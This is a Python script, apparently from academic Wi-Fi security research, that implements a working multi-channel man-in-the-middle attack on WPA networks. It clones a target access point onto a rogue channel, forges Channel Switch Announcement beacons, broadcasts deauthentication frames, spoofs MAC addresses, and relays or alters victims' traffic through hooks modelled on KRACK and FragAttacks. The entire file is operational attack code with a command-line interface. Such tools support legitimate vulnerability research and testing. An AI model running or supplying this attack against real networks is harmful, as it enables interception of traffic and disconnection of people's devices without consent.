#!/usr/bin/env python3
# Copyright (c) 2017-2023, Mathy Vanhoef <mathy.vanhoef@kuleuven.be>
#
# This code may be distributed under the terms of the BSD license.
# See README for more details.


# --- PERFORMANCE REMARKS ---
#
# We use BFP packet filers so that only relevant Wi-Fi frames reach our script. Otherwise
# the performance of Python/Scapy is way too slow, especially when there's a lot of
# background traffic.
#
#
# --- CURRENT FRAME INJECTION APPROACH ---
#
# See also https://github.com/vanhoefm/wifi-injection
#
# AP: To clone the legitimate AP on another channel we use `iw`:
#
#     - We put the interface in AP mode (using "iw set wlan0 type __ap") and then
#       use the "start ap" command to let it broadcast beacons. This assures the
#       interface will send acknowledgements and it should retransmit frames.
#
#     - A virtual monitor interface is used to recieve and inject arbitrary frames
#
#     - TODO: It may be useful to add clients to the kernel when they are connecting?
#             o I'm not sure if rate control is done properly without adding STA info
#               to the kernel. We could do this ourselves in RadioTap but that's tedious.
#             o The client may go into sleep mode. I'm not sure the kernel will
#               buffer frames unless we explicitly added / are tracking the client?
#
#
#
# CLIENT: We try to put the interface into active monitor mode and otherwise create an AP:
#
#     - To make the interface acknowledge frames we try to put it into active monitor mode.
#       Few interfaces support this, so as a fallback we create an AP that also advertises
#       the rogue beacon on the real channel.
#       The downside of both approaches is that with them we can only reliably target a
#       single client at a time. The only known method to avoid this is to use MAC address
#       masks as done in Modwifi (https://github.com/vanhoefm/modwifi) but that requires
#       specific (older) dongles and kernel/driver modifications.
#
#     - A virtual monitor interface is used to recieve and inject arbitrary frames.
#
#     - TODO: Do we need to register/connect to the AP to get rate control working?
#

from libwifi import *
import sys, os, socket, struct, time, argparse, heapq, subprocess, atexit, select
from datetime import datetime


#### Packet Processing Functions ####

def get_eapol_msgnum(p):
	"""Return whether this is frame 1..4 in the 4-way EAPOL handshake."""
	FLAG_PAIRWISE = 0b0000001000
	FLAG_ACK      = 0b0010000000
	FLAG_SECURE   = 0b1000000000

	if not EAPOL in p: return 0

	keyinfo = raw(p[EAPOL])[5:7]
	flags = struct.unpack(">H", keyinfo)[0]
	if flags & FLAG_PAIRWISE:
		# 4-way handshake
		if flags & FLAG_ACK:
			# sent by server
			if flags & FLAG_SECURE: return 3
			else: return 1
		else:
			# sent by server
			keydatalen = struct.unpack(">H", raw(p[EAPOL])[97:99])[0]
			if keydatalen == 0: return 4
			else: return 2

	return 0


def get_eapol_replaynum(p):
	"""
	Get the 'Key Replay Counter' of EPAOL frames. This number is usually incremented
	by the AP for every EAPOL frame that is transmitted. The client must respond with
	the same replay counter that the AP used in the request frame.
	"""
	return struct.unpack(">Q", raw(p[EAPOL])[9:17])[0]


def construct_csa(channel, count=1):
	"""Construct a Channel Switch Announcement (CSA) Information Element (IE)"""
	switch_mode = 1		# Instruct STA not to transmit until channel wwitch is completed
	new_chan_num = channel	# Channel it should switch to
	switch_count = count	# After how many beacons the client should switch channels

	# Contruct the IE
	payload = struct.pack("<BBB", switch_mode, new_chan_num, switch_count)
	return Dot11Elt(ID=IEEE_TLV_TYPE_CSA, info=payload)


def append_csa(beacon, channel, count=1):
	"""
	Create and append a CSA element to the given beacon frame. An indepedent copy
	of the beacon frame is returned.
	"""
	p = beacon.copy()

	el = p[Dot11Elt]
	prevel = None
	while isinstance(el, Dot11Elt):
		prevel = el
		el = el.payload

	prevel.payload = construct_csa(channel, count)

	return p


def beacon_to_probe_resp(p):
	p = p.copy()

	# Use a high timestamp in case this is used to determine the latest network info by the client
	probe_resp = Dot11(addr2=p.addr2, addr3=p.addr3) / \
		Dot11ProbeResp(timestamp=0xAAAAAAAAAAAAAAAA, beacon_interval=p.beacon_interval, cap=p.cap)
	elements = p[Dot11Beacon].payload

	prev_tim = get_prev_element(elements, IEEE_TLV_TYPE_TIM)
	if prev_tim == None:
		return probe_resp/elements

	after_tim = prev_tim.payload.payload
	prev_tim.remove_payload()
	return probe_resp/elements/after_tim


#### Debug output functions ####

def croprepr(p, length=250):
	string = repr(p)
	if len(string) > length:
		return string[:length - 3] + "..."
	return string


def dot11_to_str(p):
	EAP_CODE = {1: "Request"}
	EAP_TYPE = {1: "Identity"}
	REASON_CODE = {1: "Unspecified", 2: "Prev_Auth_No_Longer_Valid/Timeout", 3: "STA_is_leaving", 4: "Inactivity", 6: "Unexp_Class2_Frame",
		7: "Unexp_Class3_Frame", 8: "Leaving", 15: "4-way_HS_timeout"}
	dict_or_str = lambda d, v: d.get(v, str(v))
	if p.type == FRAME_TYPE_MANAGEMENT:
		if Dot11Beacon in p:     return "Beacon(seq=%d, TSF=%d)" % (dot11_get_seqnum(p), p[Dot11Beacon].timestamp)
		if Dot11ProbeReq in p:   return "ProbeReq(seq=%d)" % dot11_get_seqnum(p)
		if Dot11ProbeResp in p:  return "ProbeResp(seq=%d)" % dot11_get_seqnum(p)
		if Dot11Auth in p:       return "Auth(seq=%d, status=%d)" % (dot11_get_seqnum(p), p[Dot11Auth].status)
		if Dot11Deauth in p:     return "Deauth(seq=%d, reason=%s)" % (dot11_get_seqnum(p), dict_or_str(REASON_CODE, p[Dot11Deauth].reason))
		if Dot11AssoReq in p:    return "AssoReq(seq=%d)" % dot11_get_seqnum(p)
		if Dot11ReassoReq in p:  return "ReassoReq(seq=%d)" % dot11_get_seqnum(p)
		if Dot11AssoResp in p:   return "AssoResp(seq=%d, status=%d)" % (dot11_get_seqnum(p), p[Dot11AssoResp].status)
		if Dot11ReassoResp in p: return "ReassoResp(seq=%d, status=%d)" % (dot11_get_seqnum(p), p[Dot11ReassoResp].status)
		if Dot11Disas in p:      return "Disas(seq=%d, reason=%s)" % (dot11_get_seqnum(p), dict_or_str(REASON_CODE, p[Dot11Disas].reason))
		if p.subtype == 13:      return "Action(seq=%d)" % dot11_get_seqnum(p)
	elif p.type == FRAME_TYPE_CONTROL:
		if p.subtype ==  9:      return "BlockAck"
		if p.subtype == 11:      return "RTS"
		if p.subtype == 13:      return "Ack"
	elif p.type == FRAME_TYPE_DATA:
		if dot11_is_encrypted_data(p): return "EncData(PN=%d, len=%d)" % (dot11_get_iv(p), len(p))
		if p.subtype == 4:       return "Null(seq=%d, sleep=%d)" % (dot11_get_seqnum(p), p.FCfield & 0x10 != 0)
		if p.subtype == 12:      return "QoS-Null(seq=%d, sleep=%d)" % (dot11_get_seqnum(p), p.FCfield & 0x10 != 0)
		if EAPOL in p:
			if get_eapol_msgnum(p) != 0: return "EAPOL-Msg%d(seq=%d, replay=%d)" % (get_eapol_msgnum(p), dot11_get_seqnum(p), get_eapol_replaynum(p))
			elif EAP in p:   return "EAP-%s,%s(seq=%d)" % (dict_or_str(EAP_CODE, p[EAP].code), dict_or_str(EAP_TYPE, p[EAP].type), dot11_get_seqnum(p))
			else:            return croprepr(p)
	return croprepr(p)


def print_rx(level, name, p, color=None, suffix=None):
	if p[Dot11].type == FRAME_TYPE_CONTROL: return
	if color is None and (Dot11Deauth in p or Dot11Disas in p) and p.addr1 != "ff:ff:ff:ff:ff:ff": color="orange"
	log(level, "%s: %s -> %s: %s%s" % (name, p.addr2, p.addr1, dot11_to_str(p), suffix if suffix else ""), color=color)


#### Man-in-the-middle Code ####

class NetworkConfig():
	def __init__(self):
		self.ssid = None
		self.real_channel = None
		self.rogue_channel = None


	def parse_beacon(self, p):
		el = p[Dot11Elt]
		while isinstance(el, Dot11Elt):
			if el.ID == IEEE_TLV_TYPE_SSID:
				self.ssid = el.info.decode()
			elif el.ID == IEEE_TLV_TYPE_CHANNEL:
				self.real_channel = orb(el.info[0])

			el = el.payload


	# TODO: Check that there also isn't a real AP of this network on 
	# the returned channel (possible for large networks e.g. eduroam).
	def find_rogue_channel(self):
		self.rogue_channel = 1 if self.real_channel >= 6 else 11


class ClientState():
	# - Initializing: we haven't seen any frames of the client yet.
	# - Connecting: we've seen frames of the client on the real channel, where it was
	#               sending data to the legitimate AP directly.
	# - GotMitm: the client has switched to the rogue channel. The MC-MITM is working!
	# - Attack_Started: not used by default. In some cases we want to wait until a certain conditions
	#                   before starting attacks (e.g. waiting after the handshake is completed).
	# - Attack_Done: not used by default. Can be set after completing an attack, in which
	#                less debug output about this client will be printed.
	Initializing, Connecting, GotMitm, Attack_Started, Attack_Done = range(5)

	def state2str(self, state):
		strings = ["Initializing", "Connecting", "GotMitm", "Attack_Started", "Attack_Done"]
		assert 0 <= state < len(strings)
		return strings[state]


	def __init__(self, macaddr):
		self.macaddr = macaddr
		self.reset()


	def reset(self):
		self.state = ClientState.Initializing

		# To reduce displaying of data and other frames
		self.lastreal = 0
		self.lastrogue = 0


	def update_state(self, state):
		log(DEBUG, f"Client {self.macaddr} moved to state {self.state2str(state)}", showtime=False)
		self.state = state


	def is_state(self, state):
		return self.state == state


	def mark_got_mitm(self):
		if self.state <= ClientState.Connecting:
			self.update_state(ClientState.GotMitm)
			log(STATUS, "Established MitM position against client %s" % self.macaddr,
				color="green", showtime=False)
			return True
		return False


	def should_forward(self, p):
		"""
		In this function you can put logic to decide whether the MC-MITM should forward or drop
		frames between the client and AP. You can infer the direction from the frame based on
		the reciever MAC address.

		As an example, in the KRACK attack, the function only allowed handshake message 1-3 to
		be forwarded but not Msg4. The client would then retransmit Msg3 causing a key reinstallation.
		"""

		# By default, everything is forwarded.
		return True


	def modify_packet(self, p):
		"""
		Here you can modify packets that are sent between the client and AP. You can infer the
		direction from the frame based on the reciever MAC address.

		As an example, in the FragAttacks this function was used to set the A-MSDU flag of
		selected frames towards the client
		"""

		# By default, frames are not modified.
		return p


	def attack_start(self):
		self.update_state(ClientState.Attack_Started)


class McMitm():
	def __init__(self, nic_real, nic_rogue, ssid, clientmac=None, dumpfile=None,
			cont_csa=False, low_output=False, strict_echo_test=False):
		self.nic_real_mon = nic_real
		self.nic_real_ap = nic_real[:13] + "ap"
		self.nic_rogue_mon = nic_rogue
		self.nic_rogue_ap = nic_rogue[:13] + "ap"

		self.dumpfile = dumpfile
		self.ssid = ssid
		self.beacon = None
		self.probe_resp = None
		self.apmac = None
		self.netconfig = None
		self.low_output = low_output
		self.strict_echo_test = strict_echo_test

		# This is set in case of targeted attacks
		self.clientmac = None if clientmac is None else clientmac.replace("-", ":").lower()
		self.last_print_roguechan = time.time()
		self.last_print_realchan = time.time()

		self.sock_real  = None
		self.sock_rogue = None
		self.clients = dict()
		self.disas_queue = []
		self.continuous_csa = cont_csa

		# To monitor wether interfaces are (still) on the proper channels
		self.last_real_beacon = None
		self.last_rogue_beacon = None


	def add_client(self, client):
		self.clients[client.macaddr] = client
		#TODO: Add client entry to the Linux kernel to frames get retransitted etc
		#      with rate control, etc.?


	def del_client(self, macaddr):
		if macaddr in self.clients:
			del self.clients[macaddr]


	def send_csa_beacon(self, numpairs=1, target=None, silent=False):
		"""
		This send two pairs of beacons with a CSA element appended. Some recievers don't work
		properly when sending only a single CSA beacon (e.g. one Intel device that we tested).
		"""
		newchannel = self.netconfig.rogue_channel
		beacon = self.beacon.copy()
		if target: beacon.addr1 = target

		for i in range(numpairs):
			# Note: Intel firmware requires first receiving a CSA beacon with a count of 2 or higher,
			# followed by one with a value of 1. When starting with 1 it errors out.
			csabeacon = append_csa(beacon, newchannel, 2)
			self.sock_real.send(csabeacon)

			csabeacon = append_csa(beacon, newchannel, 1)
			self.sock_real.send(csabeacon)

		if not silent: log(STATUS, "Injected %d CSA beacon pairs (moving stations to channel %d)" % (numpairs, newchannel), color="green")


	def send_disas(self, macaddr, color="green"):
		p = Dot11(addr1=macaddr, addr2=self.apmac, addr3=self.apmac)/Dot11Disas(reason=0)
		self.sock_rogue.send(p)
		log(STATUS, "Rogue channel: injected Disassociation to %s" % macaddr, color=color)


	def queue_disas(self, macaddr):
		if macaddr in [macaddr for shedtime, macaddr in self.disas_queue]: return
		heapq.heappush(self.disas_queue, (time.time() + 0.5, macaddr))


	def try_channel_switch(self, macaddr):
		self.send_csa_beacon()
		self.queue_disas(macaddr)


	def display_client_traffic(self, p, prefix, prevtime, suffix=None):
		if EAPOL in p:
			print_rx(INFO, prefix, p, suffix=suffix)
		elif p.type == FRAME_TYPE_DATA and p.subtype in [FRAME_DATA_NULLFUNC, FRAME_DATA_QOSNULL]:
			print_rx(DEBUG, prefix, p, suffix=suffix)
		elif p.type == FRAME_TYPE_DATA:
			if self.low_output:
				level = DEBUG
				if prevtime + 2 < time.time():
					level = INFO
					prevtime = time.time()
				print_rx(level, prefix, p, suffix=suffix , color="gray")
			else:
				print_rx(INFO, prefix, p, suffix=suffix)
		else:
			print_rx(DEBUG, prefix, p, suffix=suffix)

		return prevtime


	def handle_rx_realchan(self):
		"""
		Process a frame recieved on the channel of the real AP. This frame can either
		be sent from the real AP to a client or it can be a frame sent from a client
		that hasn't switched to the rogue channel yet.
		"""
		p = self.sock_real.recv()
		if p == None: return

		# 1. Handle (broadcast) probe requests
		if Dot11ProbeReq in p:
			self.probe_resp.addr1 = p.addr2
			self.sock_real.send(self.probe_resp)
			self.display_client_traffic(p, "Rogue channel", prevtime=self.last_print_realchan, suffix=" -- Replied")

		# 2. Handle frames sent TO the real AP. This is from a client that we haven't
		#    yet managed to move to the rouge channel.
		elif p.addr1 == self.apmac:
			# If it's an authentication to the real AP, always display it
			if Dot11Auth in p:
				print_rx(INFO, "Real channel ", p, color="orange")

				# Add an extra clear warning when we want to MitM this specific client
				if self.clientmac == p.addr2:
					log(WARNING, "Client %s is connecting on real channel, injecting CSA beacon to try to correct." % self.clientmac)

				# If we were previously tracking the client, reset its state, since it seems
				# to be connecting from scratch again.
				if p.addr2 in self.clients: self.del_client(p.addr2)

				# Send one targeted CSA beacon pair, which will be retransmitted when not ACK'ed.
				# And also send a broadcasted beacon as well.
				self.send_csa_beacon(target=p.addr2)
				self.send_csa_beacon()

				client = ClientState(p.addr2)
				client.update_state(ClientState.Connecting)
				self.add_client(client)

			# TODO: Inform Linux of the client parameters?
			elif Dot11AssoReq in p:
				if p.addr2 in self.clients:
					pass

			# Clients sending a deauthentication or disassociation to the real AP are also interesting. Always
			# display those and remove corresponding client entries.
			elif Dot11Deauth in p or Dot11Disas in p:
				print_rx(INFO, "Real channel ", p)
				if p.addr2 in self.clients: self.del_client(p.addr2)

			# Display all frames sent from a client we are tracking
			elif p.addr2 in self.clients:
				client = self.clients[p.addr2]
				client.lastreal = self.display_client_traffic(p, "Real channel ", client.lastreal)
				# FIXME: Should we try to inject another CSA beacon if we keep seeing data
				#        from the targeted client in the real channel?

			# For all other frames, only display them if they come from the targeted client
			elif self.clientmac is not None and self.clientmac == p.addr2:
				self.last_print_roguechan = self.display_client_traffic(p, "Real channel ", self.last_print_roguechan)

			# Detect if a client is going into sleep mode and print a warning. Inject a Null frame so that the AP
			# will think the client is awake though (this likely won't help much - but it's better than nothing).
			# A similar check is done when processing packets in the rogue channel.
			if p.FCfield & 0x10 != 0 and p.addr2 in self.clients and self.clients[p.addr2].state < ClientState.Attack_Done:
				log(WARNING, "Client %s is going to sleep while being in the real channel. Injecting Null frame." % p.addr2)
				self.sock_real.send(Dot11(type=2, subtype=4, addr1=self.apmac, addr2=p.addr2, addr3=self.apmac))

		# 3. Handle frames sent BY the real AP. These can be towards a client still in this channel
		#    or to a client that has already switched channels.
		elif p.addr2 == self.apmac:
			# Track time of last beacon we received. Verify channel to assure it's not the rogue AP. This is used
			# to assure that the target AP is still up and to assure our frame reception is also still working.
			if Dot11Beacon in p and orb(get_element(p, IEEE_TLV_TYPE_CHANNEL).info) == self.netconfig.real_channel:
				self.last_real_beacon = time.time()

			# - Unicat frames: already decide whether we will forward it to the rogue channel. Note that we forward
			#   frames to the rogue channel even if the client may still be on the real channel. The reason why we
			#   do this is that the client might have just switched channels, but our script hasn't yet realized
			#   that it switched channels (i.e. we didn't yet recieve frames received the on rogue channel).
			might_forward = p.addr1 in self.clients and self.clients[p.addr1].should_forward(p)
			# - Group frames: also forward all group frames to the rogue channel that this is requested by the
			#   user. Otherwise don't forward group frames. FIXME: don't reference args.
			might_forward = might_forward or (args.group and dot11_is_group(p))

			# Pay special attention to all Deauth and Disassoc frames
			if Dot11Deauth in p or Dot11Disas in p:
				print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing" if might_forward else None)
			# If targeting a specific client, display all frames towards it
			elif self.clientmac is not None and self.clientmac == p.addr1:
				suffix = " -- MitM'ing" if might_forward else None
				self.last_print_roguechan = self.display_client_traffic(p, "Real channel ", self.last_print_roguechan, suffix)
			# For other clients, just display what might be forwarded
			elif might_forward:
				print_rx(INFO, "Real channel ", p, suffix=" -- MitM")

			# We did the debug output. Now let's do the actual forwarding.
			if might_forward:
				# Note that the client might have meanwhile been deleted (e.g. when forwarding a
				# deauthentication frame). So we need to check this again.
				assert p.addr1 in self.clients
				client = self.clients[p.addr1]

				# See if we should modify the packet and then inject it.
				modified = client.modify_packet(p)
				self.sock_rogue.send(modified)

			# After forwarding we can delete client state when needed.
			if Dot11Deauth in p and p.addr1 in self.clients:
				self.del_client(p.addr1)


		# 4. Always display all frames sent by or to the targeted client, even when they are sent to/from
		#    a different AP. This may happen when the victim is connecting to a different (wrong) AP.
		elif self.clientmac is not None and self.clientmac in [p.addr1, p.addr2]:
			self.last_print_roguechan = self.display_client_traffic(p, "Real channel ", self.last_print_roguechan)


	def handle_rx_roguechan(self):
		"""
		Process a frame recieved on the rouge channel. This frame can either
		be sent from the real AP to a client or it can be a frame sent from a client
		that hasn't switched to the rogue channel yet.
		"""
		p = self.sock_rogue.recv()
		if p == None: return

		# 1. Handle frames sent BY the rouge AP interface (these are special cases)
		if p.addr2 == self.apmac:
			# Track time of last beacon we received. Verify channel to assure it's not the real AP. This is used
			# to assure that our rogue AP interface is still up and generating beacon frames.
			if Dot11Beacon in p and orb(get_element(p, IEEE_TLV_TYPE_CHANNEL).info) == self.netconfig.rogue_channel:
				self.last_rogue_beacon = time.time()
			# Display all frames sent to the targeted client. This may be accidently generated by the Linux kernel
			# so we want to be aware of them.
			if self.clientmac is not None and p.addr1 == self.clientmac:
				self.last_print_realchan = self.display_client_traffic(p, "Rogue channel", self.last_print_realchan)
			# And display all frames sent to a MitM'ed client. Like the above case, these may be accidently generated
			# by the Linux kernel and we want to be aware of them.
			elif p.addr1 in self.clients:
				client = self.clients[p.addr1]
				client.lastrogue = self.display_client_traffic(p, "Rogue channel", client.lastrogue)

		# 2. Handle (broadcast) probe requests
		elif Dot11ProbeReq in p:
			self.probe_resp.addr1 = p.addr2
			self.sock_rogue.send(self.probe_resp)
			self.display_client_traffic(p, "Rogue channel", prevtime=self.last_print_realchan, suffix=" -- Replied")

		# 3. Handle frames sent TO the AP (mainly normal frames sent by a victim client)
		elif p.addr1 == self.apmac:
			client = None

			# Check if it's an existing client we are tracking/MitM'ing
			if p.addr2 in self.clients:
				client = self.clients[p.addr2]
				will_forward = client.should_forward(p)

				# Always display Auth, AssoReq, and frames when we're MitM'ing a client.
				# Otherwise take into account rate limiting of the debug output.
				if Dot11Auth in p or Dot11AssoReq in p or client.state <= ClientState.Connecting:
					print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing")
					client.mark_got_mitm()
				else:
					client.lastrogue = self.display_client_traffic(p, "Rogue channel", client.lastrogue, suffix=" -- MitM'ing")
			# Check if it's a new client that we can MitM. Dected based on relevant management frames and
			# based on any data frame.
			elif Dot11Auth in p or Dot11AssoReq in p or p.type == FRAME_TYPE_DATA:
				print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing")
				client = ClientState(p.addr2)
				client.mark_got_mitm()
				self.add_client(client)
				will_forward = True
			# Always display all frames sent by the targeted client, taking into account output rate limiting.
			elif self.clientmac is not None and p.addr2 == self.clientmac:
				self.last_print_realchan = self.display_client_traffic(p, "Rogue channel", self.last_print_realchan)

			# If this now belongs to a client we want to track, process the packet further
			if client is not None and will_forward:
				# Detect if a client is going into sleep mode and print a warning. Remove the sleep flag
				# before forwarding (this likely won't help much - but it's better than nothing). A similar
				# check is done when processing packets in the real channel.
				if p.FCfield & 0x10 != 0 and self.clients[p.addr2].state < ClientState.Attack_Done:
					log(WARNING, "Client %s is going to sleep while being in the rogue channel. Removing sleep bit." % p.addr2)
					p.FCfield &= 0xFFEF

				self.sock_real.send(p)

			# TODO: Inform Linux of the new client / client parameters?
			# Do this after forwarding the frame to assure forwarding is fast enough.
			if Dot11Auth in p or Dot11AssoReq in p:
				pass

		# 4. Always display all frames sent by or to the targeted client, taking into account output rate limiting.
		elif self.clientmac is not None and self.clientmac in [p.addr1, p.addr2]:
			self.last_print_realchan = self.display_client_traffic(p, "Rogue channel", self.last_print_realchan)


	def configure_interfaces(self):
		# 0. Warn about common mistakes
		log(STATUS, "Note: disable Wi-Fi in your network manager so it doesn't interfere with this script")
		# This happens when targetting a specific client: both interfaces will ACK frames from each other due to the capture
		# effect, meaning certain frames will not reach the rogue AP or the client. As a result, the client will disconnect.
		log(STATUS, "Note: keep >1 meter between interfaces. Else packet delivery is unreliable & target may disconnect")

		# 1. Remove unused virtual interfaces (they might still be broadcasting after an improper exit)
		subprocess.call(["iw", self.nic_real_ap, "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
		subprocess.call(["iw", self.nic_rogue_ap, "del"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
		subprocess.check_output(["ifconfig", self.nic_real_mon, "down"])
		subprocess.check_output(["ifconfig", self.nic_rogue_mon, "down"])

		# 2. Configure monitor mode on interfaces
		subprocess.check_output(["iw", self.nic_rogue_mon, "interface", "add", self.nic_rogue_ap, "type", "__ap"])
		set_monitor_mode(self.nic_real_mon, up=False, mtu=2000)
		set_monitor_mode(self.nic_rogue_mon, up=False, mtu=2000)

		# 3. Finally put the monitor interfaces up
		subprocess.check_output(["rfkill", "unblock", "wifi"])


	def run(self):
		# With some networks cards, the beacons generated by Linux are reflected back in monitor mode.
		# On other devices that's not done. Monitor mode is a mess.
		check_rogue_beacons = False
		if get_device_driver(self.nic_rogue_mon) in ["ath9k_htc"]:
			check_rogue_beacons = True

		#
		# 1. Configure the interfaces
		#

		self.configure_interfaces()

		if self.clientmac:
			start_nic_real_ap = not set_monitor_active(self.nic_real_mon)
		else:
			# Note: some APs require handshake messages to be ACKed before proceeding (e.g. Broadcom waits for ACK on Msg1)
			log(WARNING, "WARNING: Targeting ALL clients is unreliable! Provide a specific target using --target.")

		#
		# 2. Set up the nic_real_mon interface and use it to find the target network.
		#

		# Make sure to use a recent backports driver package so we can indeed
		# capture and inject packets in monitor mode.
		subprocess.check_output(["ifconfig", self.nic_real_mon, "up"])
		self.sock_real  = MonitorSocket(type=ETH_P_ALL, iface=self.nic_real_mon , dumpfile=self.dumpfile, detect_injected=self.strict_echo_test)
		log(STATUS, f"Monitor mode: using {self.nic_real_mon} on real channel and {self.nic_rogue_mon} on rogue channel.")

		# Test monitor mode and get MAC address of the network
		# FIXME: Add an option to find the network based on the MAC address of the network
		self.beacon = find_network(self.nic_real_mon, self.ssid, opened_socket=self.sock_real)
		if self.beacon is None:
			log(ERROR, "No beacon received of network <%s>. Is monitor mode working? Did you enter the correct SSID?" % self.ssid)
			return
		self.apmac = self.beacon.addr2

		self.netconfig = NetworkConfig()
		self.netconfig.parse_beacon(self.beacon)
		if self.netconfig.real_channel > 13:
			log(WARNING, "Attack not yet tested against 5 GHz networks.")
		self.netconfig.find_rogue_channel()

		# Get a probe response that we can reuse to instantly reply to probe requests
		self.beacon[Dot11EltDSSSet].channel = self.netconfig.rogue_channel
		self.probe_resp = beacon_to_probe_resp(self.beacon)

		log(STATUS, f"Target network {self.apmac} detected on channel {self.netconfig.real_channel}", color="green")
		log(STATUS, f"Will use {self.nic_rogue_ap} to create rogue AP on channel {self.netconfig.rogue_channel}")

		# Now that we know the channel of the AP, put the monitor mode in active ACK mode (might start an AP)
		if start_nic_real_ap:
			subprocess.check_output(["iw", self.nic_real_mon, "interface", "add", self.nic_real_ap, "type", "__ap"])
			log(STATUS, f"Setting MAC address of {self.nic_real_ap} to {self.clientmac}")
			set_macaddress(self.nic_real_ap, self.clientmac)
			# Note: at least for ath9k_htc and rt2800usb the MAC address used in the
			#       beacon doesn't influence ACK / retransmission behaviour. For that
			#       behaviour it uses the configured MAC address of the interface.
			start_ap(self.nic_real_ap, self.netconfig.real_channel, self.beacon)
		else:
			log(STATUS, f"Setting MAC address of {self.nic_real_mon} to {self.clientmac}")
			set_macaddress(self.nic_real_mon, self.clientmac)

		#
		# 3. Set up the rogue AP and interfaces
		#

		log(STATUS, "Setting MAC address of %s to %s" % (self.nic_rogue_ap, self.apmac))
		set_macaddress(self.nic_rogue_ap, self.apmac)

		subprocess.check_output(["ifconfig", self.nic_rogue_mon, "up"])
		self.sock_rogue = MonitorSocket(type=ETH_P_ALL, iface=self.nic_rogue_mon, dumpfile=self.dumpfile, detect_injected=self.strict_echo_test)

		# Set BFP filters to increase performance
		bpf = "(wlan addr1 {apmac}) or (wlan addr2 {apmac})".format(apmac=self.apmac)
		if self.clientmac:
			bpf += " or (wlan addr1 {clientmac}) or (wlan addr2 {clientmac})".format(clientmac=self.clientmac)
		bpf = "(wlan type data or wlan type mgt) and (%s)" % bpf
		self.sock_real.attach_filter(bpf)
		self.sock_rogue.attach_filter(bpf)

		# Set up a rouge AP that clones the target network (don't use tempfile - it can be useful to
		# manually use the generated config).
		start_ap(self.nic_rogue_ap, self.netconfig.rogue_channel, self.beacon)
		log(STATUS, "Giving the rogue AP one second to initialize ...")
		time.sleep(1)

		#
		# 4. Inject some CSA beacons to push victims to our channel
		#

		self.send_csa_beacon(numpairs=4)

		# Try to deauthenticated all clients
		deauth = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=self.apmac, addr3=self.apmac)/Dot11Deauth(reason=3)
		self.sock_real.send(deauth)

		#
		# 5. Continue attack by monitoring both channels and performing needed actions
		#

		self.last_real_beacon = time.time()
		self.last_rogue_beacon = time.time()
		nextbeacon = time.time() + 0.01
		while True:
			sel = select.select([self.sock_rogue, self.sock_real], [], [], 0.1)
			if self.sock_real      in sel[0]: self.handle_rx_realchan()
			if self.sock_rogue     in sel[0]: self.handle_rx_roguechan()

			while len(self.disas_queue) > 0 and self.disas_queue[0][0] <= time.time():
				self.send_disas(self.disas_queue.pop()[1])

			if self.continuous_csa and nextbeacon <= time.time():
				self.send_csa_beacon(silent=True)
				nextbeacon += 0.10

			if self.last_real_beacon + 2 < time.time():
				log(WARNING, "WARNING: Didn't receive beacon from real AP for two seconds")
				self.last_real_beacon = time.time()
			if check_rogue_beacons and self.last_rogue_beacon + 2 < time.time():
				log(WARNING, "WARNING: Didn't receive beacon from rogue AP for two seconds")
				self.last_rogue_beacon = time.time()


	def stop(self):
		log(STATUS, "Cleaning up ...")
		if self.sock_real: self.sock_real.close()
		if self.sock_rogue: self.sock_rogue.close()


def cleanup():
	attack.stop()

if __name__ == "__main__":
	parser = argparse.ArgumentParser(description="Aggregation attack PoC")
	parser.add_argument("nic_real", help="Wireless monitor interface that listens on the channel of the target AP.")
	parser.add_argument("nic_rogue", help="Wireless monitor interface that will run a rogue AP.")
	parser.add_argument("ssid", help="The SSID of the network to attack.")
	parser.add_argument("-t", "--target", help="Specifically target the client with the given MAC address.")
	parser.add_argument("-p", "--dump", help="Dump captured traffic to the pcap files <this argument name>.<nic>.pcap")
	parser.add_argument("-d", "--debug", action="count", help="increase output verbosity", default=0)
	parser.add_argument("--strict-echo-test", help="Never treat frames received from the air as echoed injected frames", action='store_true')
	parser.add_argument("--continuous-csa", help="Continuously send CSA beacons on the real channel (10 CSAs/second)", action='store_true')
	parser.add_argument("--reduce-output", default=False, help="Only display new data frames every 2 seconds", action='store_true')
	parser.add_argument("--group", default=False, help="Also forward all group-addressed frames to the rouge channel", action='store_true')
	args = parser.parse_args()

	# Sanatize arguments
	if args.target:
		args.target = args.target.lower()

	change_log_level(-args.debug)

	attack = McMitm(args.nic_real, args.nic_rogue, args.ssid, args.target, args.dump,
			args.continuous_csa, args.reduce_output, args.strict_echo_test)
	atexit.register(cleanup)
	attack.run()

